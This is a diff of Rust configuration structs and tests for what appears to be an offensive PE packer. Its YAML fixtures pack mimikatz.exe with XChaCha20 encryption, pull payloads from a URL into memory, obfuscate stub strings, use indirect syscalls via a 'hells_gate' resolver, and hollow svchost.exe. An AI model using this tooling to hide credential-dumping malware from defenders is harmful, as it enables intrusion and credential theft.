@@ -1,4 +1,4 @@
-//! `serde` structs modeling the YAML configuration document.
+//! `serde` structs modeling the YAML configuration document (schema 2).
 //!
 //! Each struct maps to a block of the YAML (see `examples/configs/`).
 //! The design aims to be:
@@ -7,90 +7,112 @@
 //! - **Strict**: `deny_unknown_fields` catches typos in the YAML keys.
 //! - **Extensible**: the enums centralize the valid options, so adding a new
 //!   technique or algorithm is a localized change.
+//!
+//! Schema 2 groups everything the build needs under `build` and keeps the
+//! execution-time technique list under `runtime`. See
+//! `docs/migration-v1-v2.md` for the schema-1 → schema-2 mapping.
 
 use std::path::PathBuf;
 
 use serde::{Deserialize, Serialize};
 
 use crate::engine::obfuscation::YamlStringsConfig;
-use crate::techniques::PipelineStep;
+use crate::engine::syscalls::YamlSyscallsConfig;
+use crate::techniques::RuntimeStep;
+
+/// The only schema version we accept.
+pub const SUPPORTED_SCHEMA: u32 = 2;
+
+/// Migration hint shown when a config still declares `schema: 1`.
+const SCHEMA_1_MIGRATION: &str = "\
+schema 1 is no longer supported.
+Migration:
+  input.path      → build.payload.source
+  payload.*       → build.payload.*, build.strings
+  loader.path     → build.stub.path
+  loader.syscalls → build.stub.syscalls
+  output.*        → build.output.*
+  pipeline        → runtime
+  $build.N$       → $arg.N$
+See docs/migration-v1-v2.md for details.";
 
 /// Root document of the YAML.
 ///
-/// Groups the four blocks (`input`, `payload`, `pipeline`, `output`) plus the
-/// `schema` and `name` metadata.
+/// Two halves: `build` (what to produce) and `runtime` (the techniques the
+/// generated stub applies), plus the `schema` and `name` metadata.
 #[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
 #[serde(deny_unknown_fields)]
 pub struct Config {
-    /// Schema version. Only `1` is accepted; it is validated on deserialize.
+    /// Schema version. Only `2` is accepted; it is validated on deserialize.
     #[serde(deserialize_with = "deserialize_schema_version")]
     pub schema: u32,
 
     /// Descriptive build name (identifies the generated artifact).
     pub name: String,
 
-    /// Input block: which PE to pack.
-    pub input: InputConfig,
+    /// Build block: payload, strings, stub and output.
+    pub build: BuildConfig,
 
-    /// Payload block: how the input PE is encrypted/transformed.
-    pub payload: PayloadConfig,
-
-    /// Evasion/execution techniques to apply, in order.
+    /// Execution techniques the stub applies, in order.
     ///
-    /// It is optional: an empty pipeline packs the payload with no extra
+    /// It is optional: an empty runtime produces a stub with no extra
     /// techniques.
     #[serde(default)]
-    pub pipeline: Vec<PipelineStep>,
+    pub runtime: Vec<RuntimeStep>,
+}
 
-    /// Optional custom loader stub (a Rust template). When absent, the builtin
-    /// stub (`templates/stub/main.rs.tpl`) is used.
+/// `build` block: everything needed to produce the packed PE.
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+#[serde(deny_unknown_fields)]
+pub struct BuildConfig {
+    /// Payload block: where the input PE comes from and how it is encrypted.
+    pub payload: PayloadConfig,
+
+    /// Optional string-obfuscation configuration.
+    ///
+    /// Applies to every stub literal (template, technique fragments and anything
+    /// else the packer emits), independent of the techniques. When absent, the
+    /// packer defaults to `xor` + a random key (and warns).
     #[serde(default, skip_serializing_if = "Option::is_none")]
-    pub loader: Option<LoaderConfig>,
+    pub strings: Option<YamlStringsConfig>,
+
+    /// Stub configuration: builtin or custom, plus the syscall layer.
+    #[serde(default)]
+    pub stub: StubConfig,
 
     /// Output block: how to produce the packed PE.
     pub output: OutputConfig,
 }
 
-/// `loader` block: a user-provided stub template.
-///
-/// The file is a Rust source template with `$PLACEHOLDER$` slots that the
-/// packer fills (see `docs/custom-stubs.md`). It must define a `fn main()`.
-#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
-#[serde(deny_unknown_fields)]
-pub struct LoaderConfig {
-    /// Path to the stub template (`.rs`).
-    pub path: PathBuf,
-}
-
-/// `input` block: locates the input binary.
-///
-/// Exactly one of `path` (a local file) or `url` (a remote resource fetched in
-/// memory) must be set; semantic validation enforces this in
-/// [`crate::config::validate`].
-#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
-#[serde(deny_unknown_fields)]
-pub struct InputConfig {
-    /// Local path (relative or absolute) to the PE to be packed.
-    #[serde(default, skip_serializing_if = "Option::is_none")]
-    pub path: Option<PathBuf>,
-
-    /// Remote URL to fetch the PE from, in memory, without writing to disk.
-    #[serde(default, skip_serializing_if = "Option::is_none")]
-    pub url: Option<String>,
-}
-
-/// `payload` block: describes the cryptographic transformation of the payload.
+/// `payload` block: the input source and its cryptographic transformation.
 #[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
 #[serde(deny_unknown_fields)]
 pub struct PayloadConfig {
+    /// The input PE: a local path or a URL (the packer detects the scheme).
+    ///
+    /// Supports `http://`, `https://` and `file://` sources; anything else is a
+    /// local path. `ftp://` is recognized but not implemented.
+    pub source: String,
+
     /// Sub-block with the cryptographic configuration.
     pub crypto: CryptoConfig,
+}
 
-    /// Optional string-obfuscation configuration for stub literals.
-    ///
-    /// When absent, the packer defaults to `xor` + a random key (and warns).
+/// `stub` block: the stub configuration.
+///
+/// `path` selects a custom stub template; `syscalls` configures how the stub
+/// talks to the kernel. Both are optional: without them the builtin stub with
+/// the default syscall mode is used.
+#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
+#[serde(deny_unknown_fields)]
+pub struct StubConfig {
+    /// Path to a custom stub template (`.rs`). `None` means the builtin stub.
     #[serde(default, skip_serializing_if = "Option::is_none")]
-    pub strings: Option<YamlStringsConfig>,
+    pub path: Option<PathBuf>,
+
+    /// Syscall-layer configuration (how the stub invokes the kernel).
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub syscalls: Option<YamlSyscallsConfig>,
 }
 
 /// Cryptographic configuration of the payload.
@@ -164,19 +186,20 @@ pub enum TrimPaths {
 
 /// Validates the schema version during deserialization.
 ///
-/// Gives a clear error at parse time (not later) if the user uses a schema
-/// version we do not support yet.
+/// Gives a clear error at parse time (not later): a specific migration hint for
+/// the retired schema 1 and a generic message for anything unknown.
 fn deserialize_schema_version<'de, D>(deserializer: D) -> std::result::Result<u32, D::Error>
 where
     D: serde::Deserializer<'de>,
 {
     let version = u32::deserialize(deserializer)?;
-    if version != 1 {
-        return Err(serde::de::Error::custom(format!(
-            "unsupported schema version: {version} (only 1 is accepted)"
-        )));
+    match version {
+        SUPPORTED_SCHEMA => Ok(version),
+        1 => Err(serde::de::Error::custom(SCHEMA_1_MIGRATION)),
+        other => Err(serde::de::Error::custom(format!(
+            "unsupported schema version: {other} (only {SUPPORTED_SCHEMA} is accepted)"
+        ))),
     }
-    Ok(version)
 }
 
 #[cfg(test)]
@@ -187,26 +210,25 @@ mod tests {
 
     /// Minimal valid YAML used as a base in all tests.
     const VALID_YAML: &str = r#"
-schema: 1
+schema: 2
 name: mimikatz-basic
 
-input:
-  path: ./mimikatz.exe
+build:
+  payload:
+    source: ./mimikatz.exe
+    crypto:
+      algo: xchacha20poly1305
+      key: random
 
-payload:
-  crypto:
-    algo: xchacha20poly1305
-    key: random
+  output:
+    path: ./dist/mimikatz_packed.exe
+    arch: x64
+    strip: true
+    trim_paths: all
 
-pipeline:
+runtime:
   - technique: process_hollowing
     target: "C:\\Windows\\System32\\svchost.exe"
-
-output:
-  path: ./dist/mimikatz_packed.exe
-  arch: x64
-  strip: true
-  trim_paths: all
 "#;
 
     #[test]
@@ -214,38 +236,39 @@ output:
         let config: Config =
             serde_yml::from_str(VALID_YAML).expect("the example YAML should parse");
 
-        assert_eq!(config.schema, 1);
+        assert_eq!(config.schema, 2);
         assert_eq!(config.name, "mimikatz-basic");
-        assert_eq!(config.input.path, Some(PathBuf::from("./mimikatz.exe")));
-        assert_eq!(config.input.url, None);
+        assert_eq!(config.build.payload.source, "./mimikatz.exe");
         assert_eq!(
-            config.payload.crypto.algo,
+            config.build.payload.crypto.algo,
             CryptoAlgorithm::XChaCha20Poly1305
         );
-        assert_eq!(config.payload.crypto.key, KeySource::Random);
+        assert_eq!(config.build.payload.crypto.key, KeySource::Random);
+        assert_eq!(config.build.stub.path, None);
+        assert_eq!(config.build.stub.syscalls, None);
         assert_eq!(
-            config.pipeline,
-            vec![PipelineStep::ProcessHollowing(Params {
+            config.runtime,
+            vec![RuntimeStep::ProcessHollowing(Params {
                 target: r"C:\Windows\System32\svchost.exe".to_string(),
             })]
         );
         assert_eq!(
-            config.output.path,
+            config.build.output.path,
             PathBuf::from("./dist/mimikatz_packed.exe")
         );
-        assert_eq!(config.output.arch, Arch::X64);
-        assert!(config.output.strip);
-        assert_eq!(config.output.trim_paths, TrimPaths::All);
+        assert_eq!(config.build.output.arch, Arch::X64);
+        assert!(config.build.output.strip);
+        assert_eq!(config.build.output.trim_paths, TrimPaths::All);
     }
 
     #[test]
     fn parses_strings_block() {
         let yaml = VALID_YAML.replace(
-            "payload:\n  crypto:\n    algo: xchacha20poly1305\n    key: random\n",
-            "payload:\n  crypto:\n    algo: xchacha20poly1305\n    key: random\n  strings:\n    strategy: stack\n    key: random\n",
+            "  output:\n",
+            "  strings:\n    strategy: stack\n    key: random\n\n  output:\n",
         );
         let config: Config = serde_yml::from_str(&yaml).expect("strings block should parse");
-        let strings = config.payload.strings.expect("strings should be present");
+        let strings = config.build.strings.expect("strings should be present");
         assert_eq!(strings.strategy, "stack");
         assert_eq!(strings.key, "random");
     }
@@ -253,54 +276,87 @@ output:
     #[test]
     fn strings_block_is_optional() {
         let config: Config = serde_yml::from_str(VALID_YAML).expect("valid YAML should parse");
-        assert_eq!(config.payload.strings, None);
+        assert_eq!(config.build.strings, None);
     }
 
     #[test]
-    fn loader_block_is_optional() {
+    fn stub_block_is_optional_and_defaults_to_builtin() {
         let config: Config = serde_yml::from_str(VALID_YAML).expect("valid YAML should parse");
-        assert_eq!(config.loader, None);
+        assert_eq!(config.build.stub, StubConfig::default());
     }
 
     #[test]
-    fn parses_loader_block() {
+    fn parses_stub_path_block() {
         let yaml = VALID_YAML.replace(
-            "output:\n  path: ./dist/mimikatz_packed.exe",
-            "loader:\n  path: ./my_stub.rs\n\noutput:\n  path: ./dist/mimikatz_packed.exe",
+            "  output:\n",
+            "  stub:\n    path: ./my_stub.rs\n\n  output:\n",
         );
-        let config: Config = serde_yml::from_str(&yaml).expect("loader block should parse");
-        assert_eq!(
-            config.loader.map(|l| l.path),
-            Some(PathBuf::from("./my_stub.rs"))
-        );
+        let config: Config = serde_yml::from_str(&yaml).expect("stub block should parse");
+        assert_eq!(config.build.stub.path, Some(PathBuf::from("./my_stub.rs")));
     }
 
     #[test]
-    fn parses_url_input() {
-        let yaml = VALID_YAML.replace(
-            "input:\n  path: ./mimikatz.exe\n",
-            "input:\n  url: https://example.com/mimikatz.exe\n",
-        );
-        let config: Config = serde_yml::from_str(&yaml).expect("a url input should parse");
+    fn stub_path_null_means_builtin() {
+        let yaml = VALID_YAML.replace("  output:\n", "  stub:\n    path: null\n\n  output:\n");
+        let config: Config = serde_yml::from_str(&yaml).expect("null path should parse");
+        assert_eq!(config.build.stub.path, None);
+    }
 
-        assert_eq!(config.input.path, None);
+    #[test]
+    fn parses_stub_syscalls_block() {
+        let yaml = VALID_YAML.replace(
+            "  output:\n",
+            "  stub:\n    syscalls:\n      mode: indirect\n\n  output:\n",
+        );
+        let config: Config = serde_yml::from_str(&yaml).expect("syscalls block should parse");
+        assert_eq!(config.build.stub.path, None);
+        let syscalls = config
+            .build
+            .stub
+            .syscalls
+            .expect("syscalls should be present");
+        assert_eq!(syscalls.mode, "indirect");
+        assert_eq!(syscalls.resolver, "hells_gate");
+    }
+
+    #[test]
+    fn stub_syscalls_defaults_mode_and_resolver() {
+        let yaml = VALID_YAML.replace("  output:\n", "  stub:\n    syscalls: {}\n\n  output:\n");
+        let config: Config = serde_yml::from_str(&yaml).expect("empty syscalls should parse");
+        let syscalls = config
+            .build
+            .stub
+            .syscalls
+            .expect("syscalls should be present");
+        assert_eq!(syscalls.mode, "none");
+        assert_eq!(syscalls.resolver, "hells_gate");
+    }
+
+    #[test]
+    fn parses_url_source() {
+        let yaml = VALID_YAML.replace(
+            "    source: ./mimikatz.exe\n",
+            "    source: https://example.com/mimikatz.exe\n",
+        );
+        let config: Config = serde_yml::from_str(&yaml).expect("a url source should parse");
+
         assert_eq!(
-            config.input.url.as_deref(),
-            Some("https://example.com/mimikatz.exe")
+            config.build.payload.source,
+            "https://example.com/mimikatz.exe"
         );
     }
 
     #[test]
     fn process_hollowing_defaults_target() {
         let yaml = VALID_YAML.replace(
-            "pipeline:\n  - technique: process_hollowing\n    target: \"C:\\\\Windows\\\\System32\\\\svchost.exe\"\n",
-            "pipeline:\n  - technique: process_hollowing\n",
+            "runtime:\n  - technique: process_hollowing\n    target: \"C:\\\\Windows\\\\System32\\\\svchost.exe\"\n",
+            "runtime:\n  - technique: process_hollowing\n",
         );
         let config: Config =
             serde_yml::from_str(&yaml).expect("process_hollowing without target should parse");
         assert_eq!(
-            config.pipeline,
-            vec![PipelineStep::ProcessHollowing(Params {
+            config.runtime,
+            vec![RuntimeStep::ProcessHollowing(Params {
                 target: default_target(),
             })]
         );
@@ -319,13 +375,53 @@ output:
     }
 
     #[test]
-    fn rejects_unsupported_schema_version() {
-        let yaml = VALID_YAML.replace("schema: 1", "schema: 2");
-        let err = serde_yml::from_str::<Config>(&yaml).expect_err("schema 2 should fail");
+    fn rejects_schema_one_with_a_migration_message() {
+        let yaml = VALID_YAML.replace("schema: 2", "schema: 1");
+        let err = serde_yml::from_str::<Config>(&yaml).expect_err("schema 1 should fail");
         let msg = err.to_string();
         assert!(
-            msg.contains("schema version"),
+            msg.contains("schema 1 is no longer supported"),
             "unclear error message: {msg}"
+        );
+        assert!(msg.contains("build.payload.source"), "msg: {msg}");
+        assert!(msg.contains("$arg.N$"), "msg: {msg}");
+        assert!(msg.contains("docs/migration-v1-v2.md"), "msg: {msg}");
+    }
+
+    #[test]
+    fn rejects_unknown_schema_version() {
+        let yaml = VALID_YAML.replace("schema: 2", "schema: 3");
+        let err = serde_yml::from_str::<Config>(&yaml).expect_err("schema 3 should fail");
+        let msg = err.to_string();
+        assert!(
+            msg.contains("unsupported schema version"),
+            "unclear error message: {msg}"
+        );
+    }
+
+    #[test]
+    fn rejects_schema_one_keys() {
+        // A schema-1 document is rejected by the version check, not by the
+        // (now unknown) top-level keys.
+        let yaml = r#"
+schema: 1
+name: old
+input:
+  path: ./p.exe
+payload:
+  crypto:
+    algo: xchacha20poly1305
+    key: random
+output:
+  path: ./dist/o.exe
+  arch: x64
+  strip: true
+  trim_paths: all
+"#;
+        let err = serde_yml::from_str::<Config>(yaml).expect_err("schema 1 should fail");
+        assert!(
+            err.to_string().contains("schema 1 is no longer supported"),
+            "unclear error: {err}"
         );
     }
 
@@ -348,12 +444,24 @@ output:
     }
 
     #[test]
-    fn allows_empty_pipeline() {
+    fn rejects_legacy_top_level_input_block() {
         let yaml = VALID_YAML.replace(
-            "pipeline:\n  - technique: process_hollowing\n    target: \"C:\\\\Windows\\\\System32\\\\svchost.exe\"\n",
+            "build:\n  payload:\n    source: ./mimikatz.exe\n",
+            "input:\n  path: ./mimikatz.exe\nbuild:\n  payload:\n    crypto:\n      algo: xchacha20poly1305\n      key: random\n",
+        );
+        assert!(
+            serde_yml::from_str::<Config>(&yaml).is_err(),
+            "the schema-1 `input` block should fail (deny_unknown_fields)"
+        );
+    }
+
+    #[test]
+    fn allows_empty_runtime() {
+        let yaml = VALID_YAML.replace(
+            "runtime:\n  - technique: process_hollowing\n    target: \"C:\\\\Windows\\\\System32\\\\svchost.exe\"\n",
             "",
         );
-        let config: Config = serde_yml::from_str(&yaml).expect("an empty pipeline should be valid");
-        assert!(config.pipeline.is_empty());
+        let config: Config = serde_yml::from_str(&yaml).expect("an empty runtime should be valid");
+        assert!(config.runtime.is_empty());
     }
 }
